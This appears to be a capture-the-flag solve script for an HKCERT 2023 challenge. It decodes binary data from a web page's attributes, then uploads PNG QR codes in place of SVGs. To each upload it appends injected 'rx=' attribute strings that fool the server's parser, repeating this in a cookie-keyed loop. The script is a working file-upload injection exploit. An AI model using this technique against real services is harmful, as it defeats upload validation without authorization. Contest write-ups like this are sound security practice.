import qrcode
import qrcode.image.svg
import requests
import re
from PIL import Image

url = "http://stcode-3983gi.hkcert23.pwnable.hk:28211/"

def decode_binary_string(s):
    return ''.join(chr(int(s[i*8:i*8+8],2)) for i in range(len(s)//8))

def encode_binary_string(s):
	return ''.join(f'{ord(i):08b}' for i in s)

def encode_payload(s):
	return '"rx="'+'"rx="'.join(list(s))+'"'

# flag1: read ST code
r = requests.get(url+"flag1")
matches = re.findall('rx="([01])"',r.text)
flag1 = decode_binary_string(''.join(matches))
print(flag1)

# flag2: write ST code
img = qrcode.make(flag1)
img.save("tmp_qrcode")
svg = open("tmp_qrcode","rb")	# yeah it is png not svg because svg sucks
r = requests.get(url+"flag2", allow_redirects=False)
cookie = r.headers['Set-Cookie']
r = requests.post(url+"flag2",files={'svg':svg},headers={'Cookie':cookie})
print(r.text)
svg.close()
for i in range(15):
	rows = r.text.split("\n") 
	qr = rows[2]
	st = rows[4]
	img = qrcode.make(qr)
	img.save("tmp_qrcode")
	tmp = open("tmp_qrcode","ab")
	st1 = encode_binary_string(st)
	st2 = encode_payload(st1)
	tmp.write(st2.encode()) # you can write as <!-- comment --> if you found a proper svg qrcode...
	tmp.close()
	svg = open("tmp_qrcode","rb")
	r = requests.post(url+"flag2",files={'svg':svg},headers={'Cookie':cookie})
	print(r.text)
	svg.close()
